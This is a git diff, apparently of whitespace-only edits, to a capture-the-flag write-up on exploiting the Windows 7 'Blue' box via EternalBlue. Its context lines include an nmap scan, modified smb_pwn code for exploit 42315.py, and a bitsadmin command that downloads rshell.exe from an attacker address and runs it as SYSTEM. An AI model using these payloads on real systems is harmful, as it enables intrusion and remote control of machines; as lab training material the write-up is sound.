@@ -19,10 +19,11 @@ Blue is a Windows box that was vulnerable to the infamous EternalBlue exploit wh
 * Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
 
 **Port Scan**
+
 ```
 nmap -vv -Pn -sT -A -p- 10.10.10.40 -oN /mnt/data/boxes/blue/_full_tcp_nmap.txt
 ```
-    
+
 * 135/tcp - Microsoft Windows RPC
 * 139/tcp - Microsoft Windows netbios-ssn
 * 445/tcp - Microsoft Windows SMB
@@ -64,7 +65,7 @@ Line 910: Modify the smb_pwn function. This specifies the source of the file to 
 
 ```
 def smb_pwn(conn, arch):
-    
+
     smbConn = conn.get_smbconnection()
     smb_send_file(smbConn, '/root/boxes/blue/rshell.exe', 'C', 'rshell.exe')
     service_exec(conn, r'cmd /c c:\\rshell.exe')
@@ -106,13 +107,14 @@ I updated 42315.py to reflect the changes needed to use bitsadmin to download an
 
 ```
 def smb_pwn(conn, arch):
-    
+
     smbConn = conn.get_smbconnection()
     service_exec(conn, r'cmd /c bitsadmin /transfer pwnage /download /priority high http://10.10.14.8/rshell.exe c:\windows\temp\rhell.exe')
     service_exec(conn, r'cmd /c c:\\windows\\temp\\rshell.exe')
 ```
 
 I ran the exploit and receved a callback and shell as 'nt authority\system'
+
 ```
 ./42315.py 10.10.10.40 samr
 ```
